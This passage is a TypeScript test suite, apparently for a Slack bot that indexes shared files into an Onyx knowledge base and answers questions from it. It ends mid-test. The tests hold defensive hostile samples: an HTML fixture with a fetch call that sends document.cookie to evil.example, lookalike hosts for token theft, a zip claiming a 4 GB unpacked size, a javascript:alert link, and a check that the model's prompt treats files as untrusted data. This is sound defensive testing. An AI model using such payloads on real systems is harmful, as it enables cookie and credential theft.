import ExcelJS from "exceljs";
import JSZip from "jszip";
import { pino } from "pino";
import { describe, expect, it, vi } from "vitest";
import type { LlmClient } from "../src/agent/llm.js";
import { Router } from "../src/router/index.js";
import { createKbAsk, pickSources, searchFailure, toMrkdwn } from "../src/skills/kb-ask/index.js";
import { createKbCollect } from "../src/skills/kb-collect/index.js";
import { sampleSections } from "../src/skills/kb-files/describe.js";
import { fileDocId } from "../src/skills/kb-files/collect.js";
import { createKbFiles } from "../src/skills/kb-files/index.js";
import type { SkillContext } from "../src/skills/types.js";
import type { Notifier, Task } from "../src/task.js";
import { assertSafeZip, cleanPages, detectKind, extract, htmlToText, UnsupportedFileError } from "../src/tools/extract.js";
import { HttpOnyxClient, OnyxError, type OnyxClient, type OnyxDocument, type OnyxSearchResult } from "../src/tools/onyx.js";
import { createSlackReader, SlackFileError, type SlackFile, type SlackMessage, type SlackReader, type SlackWebApi } from "../src/tools/slack.js";

const log = pino({ level: "silent" });
const limits = { maxChars: 100_000 };

// ---- fixtures --------------------------------------------------------------------------------------------

function pdf(...pageTexts: string[]): Buffer {
  const n = pageTexts.length || 1;
  const texts = pageTexts.length ? pageTexts : [""];
  const objs: string[] = [
    "<< /Type /Catalog /Pages 2 0 R >>",
    `<< /Type /Pages /Kids [${texts.map((_, i) => `${6 + i * 2} 0 R`).join(" ")}] /Count ${n} >>`,
    "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    "<< >>",
    "<< >>",
  ];
  texts.forEach((t, i) => {
    const content = t.split("\n").map((l, j) => `BT /F1 12 Tf 20 ${180 - j * 16} Td (${l}) Tj ET`).join("\n");
    objs.push(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 400 200] /Contents ${7 + i * 2} 0 R /Resources << /Font << /F1 3 0 R >> >> >>`);
    objs.push(`<< /Length ${content.length} >>\nstream\n${content}\nendstream`);
  });
  let out = "%PDF-1.4\n";
  const offsets: number[] = [];
  objs.forEach((o, i) => {
    offsets.push(out.length);
    out += `${i + 1} 0 obj\n${o}\nendobj\n`;
  });
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, "0")} 00000 n \n`).join("")}`;
  out += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF`;
  return Buffer.from(out, "latin1");
}

async function docx(paragraphs: string[]): Promise<Buffer> {
  const z = new JSZip();
  z.file("[Content_Types].xml", `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`);
  z.file("_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`);
  z.file("word/document.xml", `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${paragraphs.map((p) => `<w:p><w:r><w:t>${p}</w:t></w:r></w:p>`).join("")}</w:body></w:document>`);
  return z.generateAsync({ type: "nodebuffer" });
}

async function xlsx(): Promise<Buffer> {
  const wb = new ExcelJS.Workbook();
  const a = wb.addWorksheet("Budget");
  a.addRow(["Team", "Q3 spend"]);
  a.addRow(["Platform", 1200]);
  a.addRow(["SRE", { formula: "B2*2", result: 2400 }]);
  wb.addWorksheet("Secret sheet").state = "hidden";
  wb.getWorksheet("Secret sheet")!.addRow(["hidden-value"]);
  return Buffer.from(await wb.xlsx.writeBuffer());
}

async function pptx(): Promise<Buffer> {
  const z = new JSZip();
  z.file("ppt/slides/slide2.xml", `<p:sld><a:p><a:r><a:t>Roadmap &amp; risks</a:t></a:r></a:p></p:sld>`);
  z.file("ppt/slides/slide1.xml", `<p:sld><a:p><a:r><a:t>Welcome</a:t></a:r></a:p></p:sld>`);
  z.file("ppt/notesSlides/notesSlide1.xml", `<p:notes><a:p><a:r><a:t>say hi</a:t></a:r></a:p></p:notes>`);
  return z.generateAsync({ type: "nodebuffer" });
}

// ---- extraction ------------------------------------------------------------------------------------------

describe("extract", () => {
  it("reads a PDF", async () => {
    const r = await extract(pdf("Hello quarterly report"), "r.pdf", "application/pdf", limits);
    expect(r.kind).toBe("pdf");
    expect(r.sections[0]!.text).toContain("Hello quarterly report");
    expect(r.sections[0]!.title).toMatch(/Page/);
  });

  it("drops running headers/footers and table-of-contents lines from PDFs, keeping page markers", async () => {
    const page = (n: number, body: string) => `CONFIDENTIAL Corp | Doc 7 | ${n}\n${body}`;
    const r = await extract(
      pdf(page(1, "Contents\nCompute Tray ........ 3"), page(2, "Intro text"), page(3, "The compute tray has four GPUs."), page(4, "Networking text")),
      "d.pdf", "application/pdf", limits,
    );
    const text = r.sections.map((s) => s.text).join("\n");
    expect(text).not.toContain("CONFIDENTIAL");
    expect(text).not.toContain("........");
    expect(text).toContain("[Page 3]\nThe compute tray has four GPUs.");
  });

  it("only treats repeated lines as furniture when the document is long enough to tell", () => {
    expect(cleanPages(["Same line", "Same line", "Same line"])).toEqual(["Same line", "Same line", "Same line"]);
    const words = ["alpha", "bravo", "charlie", "delta", "echo"];
    const many = words.map((w, i) => `Footer ${i}\nbody ${w}`);
    expect(cleanPages(many)).toEqual(words.map((w) => `body ${w}`));
  });

  it("reads a DOCX", async () => {
    const r = await extract(await docx(["Incident review", "Root cause: cache"]), "a.docx", undefined, limits);
    expect(r.kind).toBe("docx");
    expect(r.sections.map((s) => s.text).join("\n")).toContain("Root cause: cache");
  });

  it("reads visible XLSX sheets only, using formula results", async () => {
    const r = await extract(await xlsx(), "b.xlsx", undefined, limits);
    const text = r.sections.map((s) => `${s.title}\n${s.text}`).join("\n");
    expect(text).toContain("Sheet: Budget");
    expect(text).toContain("Columns: Team | Q3 spend");
    expect(text).toContain("Team: Platform | Q3 spend: 1200");
    expect(text).toContain("Team: SRE | Q3 spend: 2400");
    expect(text).not.toContain("hidden-value");
  });

  it("keeps wide rows self-describing: every value is labelled with its column, blanks dropped, notes kept", async () => {
    const wb = new ExcelJS.Workbook();
    const ws = wb.addWorksheet("BareMetal");
    ws.addRow(["Role", "Used", "Rack", "Inband", "Inband GW", "Host-BMC"]);
    ws.addRow(["Compute6", "", "BJ.18", "100.82.3.4", "vlan 2004 100.82.3.1/25", "100.74.4.66"]);
    ws.addRow(["Note: OS subnet is vlan 208"]);
    const r = await extract(Buffer.from(await wb.xlsx.writeBuffer()), "ips.xlsx", undefined, limits);
    const text = r.sections[0]!.text;
    expect(text).toContain("Role: Compute6 | Rack: BJ.18 | Inband: 100.82.3.4 | Inband GW: vlan 2004 100.82.3.1/25 | Host-BMC: 100.74.4.66");
    expect(text).not.toContain("Used:");
    expect(text).toContain("Note: OS subnet is vlan 208");
  });

  it("reads PPTX slides in order, with notes and decoded entities", async () => {
    const r = await extract(await pptx(), "d.pptx", undefined, limits);
    expect(r.sections.map((s) => s.title)).toEqual(["Slide 1", "Slide 2"]);
    expect(r.sections[0]!.text).toContain("Speaker notes: say hi");
    expect(r.sections[1]!.text).toContain("Roadmap & risks");
  });

  it("reads text, CSV and HTML", async () => {
    expect((await extract(Buffer.from("a,b\n1,2\r\n"), "x.csv", "text/csv", limits)).sections[0]!.text).toBe("Columns: a | b\na: 1 | b: 2");
    const quoted = await extract(Buffer.from('Host,Note\n"web,1","said ""hi""\nbye"\ndb,\n'), "h.csv", undefined, limits);
    expect(quoted.sections[0]!.text).toBe('Columns: Host | Note\nHost: web,1 | Note: said "hi" bye\ndb');
    expect((await extract(Buffer.from("k\tv\nx\ty"), "t.tsv", undefined, limits)).sections[0]!.text).toBe("Columns: k | v\nk: x | v: y");
    expect(htmlToText("<style>x{}</style><h1>Title</h1><p>a &amp; b</p><script>evil()</script>")).toContain("a & b");
    expect(htmlToText("<script>evil()</script>ok")).not.toContain("evil");
  });

  it("reads content that a page keeps in a script data literal, without running the script", async () => {
    const html = `<html><body><h1>Catalog</h1><table><thead><tr><th>Device</th><th>Stream</th></tr></thead><tbody></tbody></table><div id="app"></div><script>
/* Fields: n=item k=metric d=meaning s=severity */
const CATS = [
 {id:'gpu', title:'GPU subsystem', groups:[
  {g:'Temperature', items:[
   {n:'GPU temp', k:'<code>DCGM_FI_DEV_GPU_TEMP</code>', d:'Die temp &lt; 80C', s:'P2'},
   {n:"Quote's", k:'x', d:'multi\\nline', s:'P3',},
  ]},
 ]},
];
const LOGS = [['GPU server OS','gpu_node_logs'],['BMC','bmc_logs'],['PDU','pdu_logs'],['Switch ports and optics','switch_logs'],['Storage controllers and arrays','storage_logs'],['Cooling distribution units','cdu_logs'],['Firewall traffic and threat','fw_logs']];
const BAD = [ {x: fetch('https://evil.example/' + document.cookie)} , padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding padding ];
const TPL = [ {x: \`\${process.exit(1)}\`} ];
function render(){ document.getElementById('app').innerHTML = CATS.length }
render();
</script></body></html>`;
    const r = await extract(Buffer.from(html), "cat.html", "text/html", limits);
    const text = r.sections.map((s) => s.text).join("\n");
    expect(text).toContain("Catalog"); // the visible text is still there
    expect(text).toContain("[GPU subsystem > Temperature] item: GPU temp | metric: DCGM_FI_DEV_GPU_TEMP | meaning: Die temp < 80C | severity: P2");
    expect(text).toContain("item: Quote's");
    expect(text).toContain("Device: GPU server OS | Stream: gpu_node_logs");
    expect(text).not.toMatch(/evil\.example|process\.exit|render\(\)/); // code and expressions are skipped, never evaluated
    expect(r.sections.some((s) => s.title.startsWith("Data: CATS"))).toBe(true);
  });

  it("splits long text into several labelled sections and truncates at the limit", async () => {
    const big = Buffer.from(Array.from({ length: 2000 }, (_, i) => `line ${i} of the log`).join("\n"));
    const r = await extract(big, "big.log", undefined, limits);
    expect(r.sections.length).toBeGreaterThan(1);
    expect(r.sections[1]!.title).toMatch(/part 2\//);
    const cut = await extract(big, "big.log", undefined, { maxChars: 5000 });
    expect(cut.truncated).toBe(true);
    expect(cut.sections.reduce((n, s) => n + s.text.length, 0)).toBeLessThanOrEqual(5000);
  });

  it("explains files it cannot read", async () => {
    expect(() => detectKind("old.doc")).toThrow(/save it as \.docx/);
    expect(() => detectKind("shot.png", "image/png")).toThrow(/OCR/);
    expect(() => detectKind("blob.bin", "application/octet-stream")).toThrow(UnsupportedFileError);
    await expect(extract(Buffer.from([1, 0, 2, 0]), "x.txt", "text/plain", limits)).rejects.toThrow(/binary/);
    await expect(extract(Buffer.from("not a pdf"), "x.pdf", undefined, limits)).rejects.toThrow(/couldn't read the PDF/);
    await expect(extract(Buffer.from("not a zip"), "x.docx", undefined, limits)).rejects.toThrow(/valid Office/);
  });

  it("rejects archives that declare an absurd unpacked size", async () => {
    const good = await docx(["x"]);
    expect(() => assertSafeZip(good)).not.toThrow();
    // patch the first central-directory entry's uncompressed size to 4 GB
    let p = good.readUInt32LE(good.length - 22 + 16);
    const evil = Buffer.from(good);
    evil.writeUInt32LE(0xffffffff, p + 24);
    expect(() => assertSafeZip(evil)).toThrow(/too large once unpacked/);
  });
});

// ---- Slack download --------------------------------------------------------------------------------------

describe("slack file download", () => {
  const api = { conversations: { replies: vi.fn(), info: vi.fn() }, users: { info: vi.fn() }, chat: { getPermalink: vi.fn() } } as unknown as SlackWebApi;
  const file: SlackFile = { id: "F1", name: "r.pdf", size: 10, downloadUrl: "https://files.slack.com/files-pri/T-F1/r.pdf" };
  const reader = (res: Response | Error) => {
    const f = vi.fn(async () => {
      if (res instanceof Error) throw res;
      return res;
    });
    return { f, r: createSlackReader(api, { token: "xoxb-test", fetchImpl: f as unknown as typeof fetch }) };
  };

  it("fetches with the bot token", async () => {
    const { f, r } = reader(new Response("hello", { headers: { "content-type": "application/pdf" } }));
    expect((await r.download(file, 1000)).toString()).toBe("hello");
    expect((f.mock.calls[0] as unknown as [URL, RequestInit])[1].headers).toEqual({ authorization: "Bearer xoxb-test" });
  });

  it("never sends the token to another host or over http", async () => {
    const { f, r } = reader(new Response("x"));
    for (const downloadUrl of ["https://evil.example.com/x", "https://files.slack.com.evil.com/x", "http://files.slack.com/x", undefined]) {
      await expect(r.download({ ...file, downloadUrl }, 1000)).rejects.toThrow(SlackFileError);
    }
    expect(f).not.toHaveBeenCalled();
  });

  it("enforces the size cap by declared size and while streaming", async () => {
    await expect(reader(new Response("x")).r.download({ ...file, size: 5000 }, 1000)).rejects.toThrow(/too large/);
    const { r } = reader(new Response("x".repeat(2000)));
    await expect(r.download({ ...file, size: undefined }, 1000)).rejects.toThrow(/too large/);
  });

  it("recognises Slack's login page (missing files:read) and redirects as a refusal", async () => {
    await expect(reader(new Response("<html>", { headers: { "content-type": "text/html" } })).r.download(file, 1000)).rejects.toThrow(/files:read/);
    await expect(reader(new Response(null, { status: 302 })).r.download(file, 1000)).rejects.toThrow(/files:read/);
    // a genuine .html attachment is fine
    const ok = reader(new Response("<p>hi</p>", { headers: { "content-type": "text/html" } }));
    expect((await ok.r.download({ ...file, name: "page.html" }, 1000)).toString()).toBe("<p>hi</p>");
  });

  it("turns network errors into a SlackFileError", async () => {
    await expect(reader(new Error("boom")).r.download(file, 1000)).rejects.toThrow(/download failed: boom/);
  });

  it("lists attachments on thread messages, skipping deleted and external files", async () => {
    const replies = vi.fn().mockResolvedValue({
      messages: [
        {
          ts: "1", user: "U1", text: "see files",
          files: [
            { id: "F1", name: "a.pdf", mimetype: "application/pdf", size: 5, permalink: "https://x/F1", url_private_download: "https://files.slack.com/a" },
            { id: "F2", name: "gone", mode: "tombstone" },
            { id: "F3", name: "gdoc", mode: "external" },
          ],
        },
      ],
    });
    const r = createSlackReader({ ...api, conversations: { replies, info: vi.fn() }, users: { info: vi.fn().mockResolvedValue({ user: { name: "ann" } }) } } as unknown as SlackWebApi);
    const [m] = await r.thread("C1", "1");
    expect(m!.attachments).toEqual([{ id: "F1", name: "a.pdf", mimetype: "application/pdf", size: 5, permalink: "https://x/F1", downloadUrl: "https://files.slack.com/a" }]);
  });
});

// ---- Onyx search -----------------------------------------------------------------------------------------

describe("HttpOnyxClient.search", () => {
  const settings = { baseUrl: "https://onyx.test/", ingestionPath: "/api/ingestion", ccPairId: 1, apiKey: "k" };

  it("posts the query and maps results", async () => {
    const f = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ results: [{ title: "Q3.pdf", content: "spend was 5", link: "https://s/F1", updated_at: "2026-10-01", citation_id: 1 }, { title: "empty", content: "" }] })),
    );
    const out = await new HttpOnyxClient(settings, f as unknown as typeof fetch).search("what was spend?", 5);
    expect(out).toEqual([{ title: "Q3.pdf", content: "spend was 5", link: "https://s/F1", updatedAt: "2026-10-01" }]);
    const [url, init] = f.mock.calls[0] as [string, RequestInit];
    expect(url).toBe("https://onyx.test/api/search");
    expect(JSON.parse(init.body as string)).toEqual({ query: "what was spend?" });
  });

  it("gives search its own, longer timeout", async () => {
    const spy = vi.spyOn(AbortSignal, "timeout");
    const f = vi.fn().mockResolvedValue(new Response(JSON.stringify({ results: [] })));
    await new HttpOnyxClient({ ...settings, timeoutMs: 5000 }, f as unknown as typeof fetch).search("q", 3);
    await new HttpOnyxClient({ ...settings, timeoutMs: 5000 }, f as unknown as typeof fetch).delete("d");
    expect(spy.mock.calls.map((c) => c[0])).toEqual([90_000, 5000]);
    spy.mockRestore();
  });

  it("honours searchPath and the result limit, and clips long queries", async () => {
    const f = vi.fn().mockResolvedValue(new Response(JSON.stringify({ results: [1, 2, 3].map((n) => ({ title: `t${n}`, content: "c" })) })));
    const out = await new HttpOnyxClient({ ...settings, searchPath: "/onyx-api/search" }, f as unknown as typeof fetch).search("q".repeat(5000), 2);
    expect(out).toHaveLength(2);
    expect((f.mock.calls[0] as [string])[0]).toBe("https://onyx.test/onyx-api/search");
    expect(JSON.parse((f.mock.calls[0] as [string, RequestInit])[1].body as string).query).toHaveLength(2048);
  });
});

// ---- skills ----------------------------------------------------------------------------------------------

const att = (id: string, name: string, extra: Partial<SlackFile> = {}): SlackFile => ({
  id, name, size: 100, permalink: `https://slack.test/files/${id}`, downloadUrl: `https://files.slack.com/${id}`, ...extra,
});
const msg = (ts: string, files: SlackFile[], text = "", userName = "Ann"): SlackMessage => ({
  ts, userId: "U1", userName, text, files: files.map((f) => f.name), attachments: files, bot: false,
});

function fakes(opts: { messages?: SlackMessage[]; kind?: "public" | "private" | "dm" | "unknown"; downloads?: Record<string, Buffer | Error>; hits?: OnyxSearchResult[]; llmReply?: string; enabled?: boolean } = {}) {
  const sent: { text: string; blocks?: any[] }[] = [];
  const notifier: Notifier = { reply: vi.fn(async (_t, text, blocks) => void sent.push({ text, blocks: blocks as any[] })), react: vi.fn() };
  const docs: OnyxDocument[] = [];
  const onyx: OnyxClient = {
    upsert: vi.fn(async (d) => (docs.push(d), { alreadyExisted: false })),
    delete: vi.fn(async () => {}),
    search: vi.fn(async () => opts.hits ?? []),
  };
  const slack: SlackReader = {
    thread: vi.fn(async () => opts.messages ?? []),
    permalink: vi.fn(async (_c: string, ts: string) => `https://slack.test/p/${ts}`),
    channel: vi.fn(async () => ({ id: "C1", name: "ops", kind: opts.kind ?? "public" })),
    userName: vi.fn(async (id) => id),
    download: vi.fn(async (f: SlackFile) => {
      const d = opts.downloads?.[f.id];
      if (d instanceof Error) throw d;
      if (!d) throw new SlackFileError("no such file");
      return d;
    }),
  };
  const llm: LlmClient = { chat: vi.fn(async () => ({ text: opts.llmReply ?? "", usage: { promptTokens: 1, completionTokens: 1 } })) };
  const ctx: SkillContext = {
    notifier, slack, llm, onyx, log, botName: "moose", maxInputTokens: 60000, charsPerToken: 4, allowPrivateChannels: false, maxSearchResults: 8,
    attachments: { enabled: opts.enabled ?? true, maxFileBytes: 1_000_000, maxFiles: 2, maxTextChars: 100_000, summarize: false },
  };
  return { sent, onyx, docs, slack, llm, ctx };
}

const task = (over: Partial<Task> = {}): Task => ({
  id: "e1", source: "slack", actor: { id: "U1" }, text: "save these files",
  reply: { kind: "slack", channel: "C1", threadTs: "100" }, triggerTs: "102", thread: { ts: "100" }, ...over,
});

describe("kb-files", () => {
  it("indexes PDF, DOCX and XLSX from a thread as separate entries, redacted, with Undo", async () => {
    const f = fakes({
      messages: [
        msg("100", [att("F1", "report.pdf", { mimetype: "application/pdf" })]),
        msg("101", [att("F2", "notes.docx")], "see this"),
        msg("102", [], "@moose save these files"),
      ],
      downloads: { F1: pdf("Quarterly report password=hunter2hunter2"), F2: await docx(["Root cause: cache"]) },
    });
    f.ctx.attachments.maxFiles = 5;
    await createKbFiles().run(task(), f.ctx);

    expect(f.docs.map((d) => d.id)).toEqual([fileDocId("F1"), fileDocId("F2")]);
    const [d1, d2] = f.docs;
    expect(JSON.stringify(d1)).not.toContain("hunter2hunter2");
    expect(d1!.sections[0]!.text).toContain("report.pdf");
    expect(d1!.sections[0]!.text).toContain("password=[REDACTED]");
    expect(d1!.sections[0]!.link).toBe("https://slack.test/files/F1");
    expect(d1!.metadata).toMatchObject({ type: "attachment", file_type: "pdf", file_name: "report.pdf", channel: "#ops", origin: "neotags", source_visibility: "public-channel" });
    expect(d2!.sections[0]!.text).toContain("Root cause: cache");

    const blocks = f.sent[0]!.blocks!;
    expect(blocks[0].text.text).toContain("Saved 2 files");
    expect(blocks[1].elements[0]).toMatchObject({ action_id: "kb-files:undo", value: `${fileDocId("F1")},${fileDocId("F2")}` });
  });

  it("uses the mention's own message when it is not in a thread", async () => {
    const f = fakes({ messages: [msg("102", [att("F1", "a.txt")], "save")], downloads: { F1: Buffer.from("hello") } });
    await createKbFiles().run(task({ thread: undefined, reply: { kind: "slack", channel: "C1", threadTs: "102" } }), f.ctx);
    expect(f.slack.thread).toHaveBeenCalledWith("C1", "102");
    expect(f.docs).toHaveLength(1);
  });

  it("reports skipped files with reasons and does not abort the rest", async () => {
    const f = fakes({
      messages: [msg("100", [att("F1", "shot.png", { mimetype: "image/png" }), att("F2", "ok.txt"), att("F3", "big.pdf")]), ],
      downloads: { F2: Buffer.from("fine") },
    });
    await createKbFiles().run(task(), f.ctx); // maxFiles = 2: F3 is over the limit
    expect(f.slack.download).toHaveBeenCalledTimes(1); // the image is refused without being downloaded
    expect(f.docs.map((d) => d.id)).toEqual([fileDocId("F2")]);
    const text = f.sent[0]!.blocks![0].text.text as string;
    expect(text).toContain("shot.png: skipped, images aren't supported");
    expect(text).toContain("big.pdf: skipped, over the limit of 2 files");
  });

  it("says when nothing could be saved, or there are no files, or the channel is not allowed", async () => {
    const none = fakes({ messages: [msg("100", [])] });
    await createKbFiles().run(task(), none.ctx);
    expect(none.sent[0]!.text).toMatch(/don't see any files/);

    const scan = fakes({ messages: [msg("100", [att("F1", "scan.pdf")])], downloads: { F1: pdf("") } });
    await createKbFiles().run(task(), scan.ctx);
    expect(scan.sent[0]!.text).toMatch(/couldn't save any.*no text found/s);
    expect(scan.docs).toHaveLength(0);

    for (const kind of ["dm", "private", "unknown"] as const) {
      const f = fakes({ kind, messages: [msg("100", [att("F1", "a.txt")])] });
      await createKbFiles().run(task(), f.ctx);
      expect(f.docs).toHaveLength(0);
      expect(f.sent).toHaveLength(1);
    }
    const off = fakes({ enabled: false });
    await createKbFiles().run(task(), off.ctx);
    expect(off.sent[0]!.text).toMatch(/turned off/);
  });

  it("re-indexing the same file reuses its id; Undo deletes every id", async () => {
    const f = fakes();
    const msgText = await createKbFiles().onAction!({ id: "undo", value: "a,b", actor: { id: "U9" }, channel: "C1" }, f.ctx);
    expect(f.onyx!.delete).toHaveBeenCalledTimes(2);
    expect(msgText).toContain("Removed 2 files");
    expect(fileDocId("F1")).toBe(fileDocId("F1"));
  });
});

describe("file summaries", () => {
  const fileSummary = JSON.stringify({
    description: "Subnet and IP record for the Denver SRE bare-metal hosts.",
    contents: ["Sheet BareMetal: one row per host; columns Role, Rack, Inband, Host-OS, Host-BMC"],
    key_facts: ["Compute6 Inband: 100.82.3.4", "Compute6 Host-BMC: 100.74.4.66 password=hunter2hunter2"],
    tags: ["network", "ip"],
  });
  const withSummary = (extra: Parameters<typeof fakes>[0] = {}) => {
    const f = fakes({
      messages: [msg("100", [att("F1", "ips.csv")], "Denver IP record for the SRE hosts <@U9>")],
      downloads: { F1: Buffer.from("Role,Inband\nCompute6,100.82.3.4") },
      llmReply: fileSummary,
      ...extra,
    });
    f.ctx.attachments.summarize = true;
    return f;
  };

  it("stores the summary as the first section, ahead of the file text, with the sharing message", async () => {
    const f = withSummary();
    await createKbFiles().run(task({ text: "save" }), f.ctx);
    const doc = f.docs[0]!;
    expect(doc.sections).toHaveLength(2);
    expect(doc.sections[0]!.text).toMatch(/^ips\.csv\nTEXT file shared by Ann/);
    expect(doc.sections[0]!.text).toContain("Summary: Subnet and IP record for the Denver SRE bare-metal hosts.");
    expect(doc.sections[0]!.text).toContain("Compute6 Inband: 100.82.3.4");
    expect(doc.sections[0]!.text).toContain('Shared with the message: "Denver IP record');
    expect(doc.sections[1]!.text).toContain("Role: Compute6 | Inband: 100.82.3.4");
    expect(doc.metadata).toMatchObject({ summarized: "true", tags: ["network", "ip"] });
    // secrets the model echoes are scrubbed, and the reply shows the description
    expect(JSON.stringify(doc)).not.toContain("hunter2hunter2");
    expect(f.sent[0]!.blocks![0].text.text).toContain("Subnet and IP record");
  });

  it("gives the model the file as untrusted data and the message as context", async () => {
    const f = withSummary();
    await createKbFiles().run(task({ text: "save" }), f.ctx);
    const [system, user] = vi.mocked(f.llm.chat).mock.calls[0]![0];
    expect(system!.content).toMatch(/untrusted DATA/);
    expect(user!.content).toContain("<message>\nDenver IP record");
    expect(user!.content).toMatch(/<file>\n\[Table\]\nColumns: Role \| Inband/);
  });

  it("still indexes the file from its own text when the summary fails", async () => {
    const f = withSummary({ llmReply: "not json" });
    await createKbFiles().run(task({ text: "save" }), f.ctx);
    expect(f.docs).toHaveLength(1);
    expect(f.docs[0]!.sections[0]!.text).toMatch(/^ips\.csv\nTEXT file shared by Ann/);
    expect(f.docs[0]!.sections[0]!.text).toContain("Role: Compute6 | Inband: 100.82.3.4");
    expect(f.docs[0]!.metadata.summarized).toBe("false");
  });

  it("lists each file's description on the thread entry", async () => {
    const f = withSummary({ messages: [msg("100", [att("F1", "ips.csv")], "checkout is 502ing again, error rate high"), msg("101", [], "fixed by flush"), msg("102", [], "<t>")] });
    // the same fake LLM answers both calls, so give it a reply valid for the thread summary and the file summary
    const both = { ...JSON.parse(fileSummary), title: "Checkout 502s", type: "incident", summary: "502s.", problem: "p", root_cause: "cache", resolution: "warm", follow_ups: [], services: [], confidence: "high" };
    vi.mocked(f.llm.chat).mockResolvedValue({ text: JSON.stringify(both), usage: { promptTokens: 1, completionTokens: 1 } });
    await createKbCollect().run(task({ text: "record" }), f.ctx);
    const thread = f.docs.find((d) => d.id.startsWith("neotags-slack"))!;
    expect(thread.sections.at(-1)!.text).toContain("- ips.csv: Subnet and IP record for the Denver SRE bare-metal hosts.");
  });

  it("samples a long file across its whole length within the budget", () => {
    const secs = Array.from({ length: 20 }, (_, i) => ({ title: `p${i}`, text: "x".repeat(1000) }));
    const { picked, total } = sampleSections(secs, 5000);
    expect(total).toBe(20);
    expect(picked[0]!.title).toBe("p0");
    expect(picked.length).toBeLessThanOrEqual(5);
    expect(picked.at(-1)!.title).not.toBe("p4"); // reaches beyond the head of the file
    expect(picked.map((s) => s.title)).toEqual([...picked.map((s) => s.title)].sort((a, b) => Number(a.slice(1)) - Number(b.slice(1))));
    expect(sampleSections(secs, 1e9).picked).toHaveLength(20);
  });
});

describe("kb-collect with attachments", () => {
  const summary = JSON.stringify({
    title: "Checkout 502s", type: "incident", summary: "502s.", problem: "p", root_cause: "cache", resolution: "warm", follow_ups: [],
    services: [], tags: [], confidence: "high",
  });

  it("indexes the thread's files, links them from the thread entry, and Undo removes all", async () => {
    const f = fakes({
      messages: [
        msg("100", [att("F1", "graph.txt")], "checkout is 502ing again, error rate high"),
        msg("101", [], "flushed redis, fixed it"),
        msg("102", [], "<trigger>"),
      ],
      downloads: { F1: Buffer.from("latency chart data") },
      llmReply: summary,
    });
    await createKbCollect().run(task({ text: "record the knowledge" }), f.ctx);
    expect(f.docs.map((d) => d.id)).toEqual([fileDocId("F1"), "neotags-slack-C1-100"]);
    expect(f.docs[0]!.metadata.thread_doc).toBe("neotags-slack-C1-100");
    const threadDoc = f.docs[1]!;
    expect(threadDoc.sections.some((s) => s.text.includes("graph.txt"))).toBe(true);
    const btn = f.sent[0]!.blocks!.at(-1).elements[0];
    expect(btn.value).toBe(`neotags-slack-C1-100,${fileDocId("F1")}`);
  });

  it("still records the thread when a file fails to download or attachments are off", async () => {
    const msgs = [msg("100", [att("F1", "a.txt")], "checkout is 502ing again, error rate high"), msg("101", [], "fixed by flush"), msg("102", [], "<t>")];
    const bad = fakes({ messages: msgs, downloads: { F1: new SlackFileError("too large") }, llmReply: summary });
    await createKbCollect().run(task({ text: "record" }), bad.ctx);
    expect(bad.docs.map((d) => d.id)).toEqual(["neotags-slack-C1-100"]);
    expect(bad.sent[0]!.blocks![0].text.text).toContain("a.txt: skipped, too large");

    const off = fakes({ messages: msgs, enabled: false, llmReply: summary });
    await createKbCollect().run(task({ text: "record" }), off.ctx);
    expect(off.slack.download).not.toHaveBeenCalled();
    expect(off.docs).toHaveLength(1);
  });
});

describe("kb-ask", () => {
  const hits: OnyxSearchResult[] = [
    { title: "Q3 report.pdf", content: "Churn was 4.2% in Q3.", link: "https://slack.test/files/F1" },
    { title: "Checkout 502s", content: "Cold cache overloaded the DB.", link: "javascript:alert(1)" },
  ];

  it("answers from retrieved sections with a cited source list", async () => {
    const f = fakes({ hits, llmReply: "Churn was **4.2%** in Q3 [1]." });
    await createKbAsk().run(task({ text: "what does the Q3 report say about churn? password=hunter2hunter2" }), f.ctx);

    expect(f.onyx!.search).toHaveBeenCalledWith("what does the Q3 report say about churn? password=[REDACTED]", 8);
    const sentToLlm = JSON.stringify(vi.mocked(f.llm.chat).mock.calls[0]![0]);
    expect(sentToLlm).toContain("Churn was 4.2% in Q3.");
    expect(sentToLlm).not.toContain("hunter2hunter2");
    const [answer, sources] = f.sent[0]!.blocks!;
    expect(answer.text.text).toBe("Churn was *4.2%* in Q3 [1].");
    expect(sources.elements[0].text).toBe("Sources: [1] <https://slack.test/files/F1|Q3 report.pdf>");
  });

  it("never lets document or model text ping people, and drops non-http links", async () => {
    const f = fakes({ hits, llmReply: "<!channel> see <@U123> [2]" });
    await createKbAsk().run(task({ text: "q" }), f.ctx);
    const [answer, sources] = f.sent[0]!.blocks!;
    expect(answer.text.text).toBe("&lt;!channel&gt; see &lt;@U123&gt; [2]");
    expect(sources.elements[0].text).toBe("Sources: [2] Checkout 502s");
  });

  it("treats sources as data and does not call the LLM when nothing matches", async () => {
    const f = fakes({ hits: [] });
    await createKbAsk().run(task({ text: "anything about X?" }), f.ctx);
    expect(f.llm.chat).not.toHaveBeenCalled();
    expect(f.sent[0]!.text).toMatch(/couldn't find anything/);
  });

  it("handles an empty question, missing Onyx and an empty model answer", async () => {
    const f = fakes({ hits, llmReply: "  " });
    await createKbAsk().run(task({ text: "  " }), f.ctx);
    expect(f.sent[0]!.text).toMatch(/What would you like to know/);
    await createKbAsk().run(task({ text: "q" }), f.ctx);
    expect(f.sent[1]!.text).toMatch(/couldn't put an answer together/);
    f.ctx.onyx = undefined;
    await createKbAsk().run(task({ text: "q" }), f.ctx);
    expect(f.sent[2]!.text).toMatch(/not configured/);
  });

  it("tells the user why a search failed instead of a generic error", async () => {
    const cases: [number | undefined, RegExp][] = [
      [403, /READ_SEARCH/],
